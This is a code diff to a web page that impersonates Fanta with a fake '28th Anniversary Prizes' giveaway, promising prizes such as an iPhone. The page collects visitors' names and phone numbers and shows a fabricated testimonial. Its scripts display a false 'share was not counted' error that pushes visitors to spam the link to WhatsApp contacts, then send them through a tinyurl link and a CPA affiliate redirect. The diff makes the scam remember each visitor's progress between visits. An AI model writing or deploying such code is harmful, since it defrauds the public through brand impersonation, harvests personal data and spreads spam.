@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Fanta - SHARE 2025</title>
+<title>Fanta - 28th Anniversary Prizes</title>
 			<link rel="shortcut icon" type="image/png" href="assets/logo.png" />
         <meta name="og:title" content="Fanta - 28th Anniversary Prizes" />
         <meta property="og:description" content="Fanta - 28th Anniversary Prizes" />
@@ -246,23 +246,13 @@ Thank you very much Fanta! I received the prize today and it arrived immediately
     <script src="prizes.js"></script>
     <script src="social-proof.js"></script>
     <script>
-        // Hash navigation and reload protection
-        (function() {
-            const currentHash = window.location.hash;
-            if (currentHash === "#3") {
-                // If user reloads on #3, reset to home
-                window.location.hash = "";
-                window.location.reload();
-            }
-        })();
-
         var errorname = "Please enter the name correctly!",
             errornumber = "Please enter your number correctly, example 05xxxxxxx",
-            link = "https://tinyurl.com/fanta-mz",
-			cpa = "https://otieu.com/4/10234481",
+            link = "https://tinyurl.com/fanta-en",
+			cpa = "https://otieu.com/4/9894178",
             error = "Something is wrong!\nThe share was not counted. You may have shared with the same friend or group more than once, please share again",
             saved = "pp1",
-            text = "To celebrate the 23rd anniversary, Fanta is offering shopping vouchers, mobile phones and many other valuable instant prizes. Prizes are limited, so hurry here: ",
+            text = "You’ve been invited to participate in the Fanta Anniversary giveaway🎉: ",
             share = "whatsapp://send?text=" + text + link;
 
         // Comment submission logic
@@ -374,6 +364,7 @@ $(".yes").click(function () {
                         $("#checking").fadeOut(0);
                         $("#share").fadeIn(1000);
                         window.location.hash = "2";
+                        localStorage.setItem(saved, 0); // Set initial progress to persist #2
                         $(".display-name").html($("#name").val());
                 
                 // Get prize from cookie
@@ -406,7 +397,28 @@ $(".no").click(function () {
 
 <script type="text/javascript">  
 var swidth = localStorage.getItem(saved);
-if (swidth !== null && window.location.hash === "#2") {
+var isCompleted = localStorage.getItem("share_completed");
+
+if (isCompleted === "true" && window.location.hash === "#3") {
+    $(".welcome").fadeOut(0);
+    $(".step1").fadeOut(0);
+    $("#share").fadeOut(0);
+    $("#claim").fadeIn(0);
+    
+    // Set names and prize
+    const name = localStorage.getItem("name");
+    $(".display-name").html(name);
+    
+    const prizeId = getCookie('won_prize_id') || 'iphone17';
+    const prizeData = typeof getPrizeById === 'function' ? getPrizeById(prizeId) : null;
+    
+    if (prizeData) {
+        const claimPrizeName = document.getElementById('claim-prize-name');
+        const claimPrizeImg = document.getElementById('claim-prize-img');
+        if (claimPrizeName) claimPrizeName.textContent = prizeData.fullName;
+        if (claimPrizeImg) claimPrizeImg.src = prizeData.image;
+    }
+} else if (swidth !== null && window.location.hash === "#2") {
     var width = swidth * 1;
     $(".welcome").fadeOut(0);
     $(".step1").fadeOut(0);
@@ -423,8 +435,6 @@ if (swidth !== null && window.location.hash === "#2") {
     
     const prizeDisplay = document.getElementById('display-prize');
     const prizeImgDisplay = document.getElementById('display-prize-img');
-    const claimPrizeName = document.getElementById('claim-prize-name');
-    const claimPrizeImg = document.getElementById('claim-prize-img');
     
     if (prizeData) {
         if (prizeDisplay) prizeDisplay.textContent = prizeData.fullName;
@@ -432,12 +442,9 @@ if (swidth !== null && window.location.hash === "#2") {
             prizeImgDisplay.src = prizeData.image;
             prizeImgDisplay.style.display = 'block';
         }
-        if (claimPrizeName) claimPrizeName.textContent = prizeData.fullName;
-        if (claimPrizeImg) claimPrizeImg.src = prizeData.image;
     }
 } else {
-    // If we have a hash but it's not #2, or no hash, ensure we are at step 1 or 2 appropriately
-    // But per requirements, #3 reload should go back to start.
+    // If we have a hash but conditions aren't met, reset
     if (window.location.hash === "#2" || window.location.hash === "#3") {
         window.location.hash = "";
     }
@@ -476,6 +483,7 @@ $("#whatsapp").click(function () {
         $("#share").fadeOut(0);
         $("#claim").fadeIn(1000);
         window.location.hash = "3";
+        localStorage.setItem("share_completed", "true"); // Persist #3
     }
     localStorage.setItem(saved, width);
     setTimeout(function () {
